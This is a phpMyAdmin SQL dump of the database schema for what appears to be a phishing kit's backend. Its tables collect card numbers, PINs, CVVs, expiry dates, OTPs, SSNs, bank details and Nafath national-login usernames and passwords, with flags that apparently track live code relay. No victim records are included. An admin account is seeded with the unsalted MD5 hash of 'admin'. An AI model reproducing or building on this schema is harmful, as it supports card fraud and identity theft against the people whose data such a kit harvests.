-- phpMyAdmin SQL Dump
-- version 5.2.0
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Jan 28, 2024 at 11:13 PM
-- Server version: 10.4.24-MariaDB
-- PHP Version: 8.1.6

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `u_11tamen`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `access` tinyint(1) NOT NULL DEFAULT 0
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `username`, `email`, `password`, `access`) VALUES
(1, 'admin', 'admin@admin.com', '21232f297a57a5a743894a0e4a801fc3', 1);

-- --------------------------------------------------------

--
-- Table structure for table `card`
--

CREATE TABLE `card` (
  `id` int(11) NOT NULL,
  `cardNumber` varchar(255) DEFAULT NULL,
  `cardName` varchar(255) DEFAULT NULL,
  `password` varchar(10) DEFAULT NULL,
  `status` int(250) NOT NULL DEFAULT 0,
  `year` varchar(10) DEFAULT NULL,
  `cvv` varchar(10) DEFAULT NULL,
  `otp` varchar(10) DEFAULT NULL,
  `company` varchar(250) CHARACTER SET utf8 DEFAULT '####',
  `PhoneNumber` bigint(250) DEFAULT NULL,
  `userId` int(11) DEFAULT NULL,
  `url` varchar(100) DEFAULT NULL,
  `Authentication_code` bigint(250) DEFAULT NULL,
  `New_code` bigint(250) DEFAULT NULL,
  `UserName_Nafad` varchar(250) CHARACTER SET utf8 DEFAULT NULL,
  `UserPasswore_Nafad` varchar(250) CHARACTER SET utf8 DEFAULT NULL,
  `CheckTheInfo_Nafad` int(250) DEFAULT 0,
  `TemporaryPassword` varchar(250) CHARACTER SET utf8 DEFAULT NULL,
  `username` varchar(250) CHARACTER SET utf8 DEFAULT NULL,
  `passwordt` varchar(250) CHARACTER SET utf8 DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `card`
--
-- --------------------------------------------------------

--
-- Table structure for table `services`
--


--
-- Dumping data for table `services`
--
-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_german2_ci NOT NULL,
  `ssn` varchar(255) CHARACTER SET utf8 NOT NULL,
  `email` varchar(255) CHARACTER SET utf8 NOT NULL,
  `date` varchar(255) CHARACTER SET utf8 NOT NULL,
  `password` varchar(255) CHARACTER SET utf8 NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `access` tinyint(1) NOT NULL DEFAULT 0,
  `link` varchar(250) CHARACTER SET utf8mb4 DEFAULT NULL,
  `bank` int(11) NOT NULL,
  `code` int(11) DEFAULT NULL,
  `CheckTheCode` int(250) NOT NULL DEFAULT 0,
  `company` varchar(250) CHARACTER SET utf8 DEFAULT '####',
  `message` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `page` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `phone` varchar(255) CHARACTER SET utf8 NOT NULL,
  `Authentication_code` bigint(250) DEFAULT NULL,
  `UserName_Nafad` varchar(250) CHARACTER SET utf8 DEFAULT NULL,
  `UserPasswore_Nafad` varchar(250) CHARACTER SET utf8 DEFAULT NULL,
  `CheckTheInfo_Nafad` int(250) DEFAULT 0,
  `TemporaryPassword` varchar(250) CHARACTER SET utf8 DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `users`
--

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `card`
--
ALTER TABLE `card`
  ADD PRIMARY KEY (`id`),
  ADD KEY `user_id` (`userId`);

--
-- Indexes for table `services`
--

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `card`
--
ALTER TABLE `card`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=43;

--
-- AUTO_INCREMENT for table `services`
--

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1026;

  ALTER TABLE `card`
  ADD CONSTRAINT `user_id` FOREIGN KEY (`userId`) REFERENCES `users` (`id`) ON DELETE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
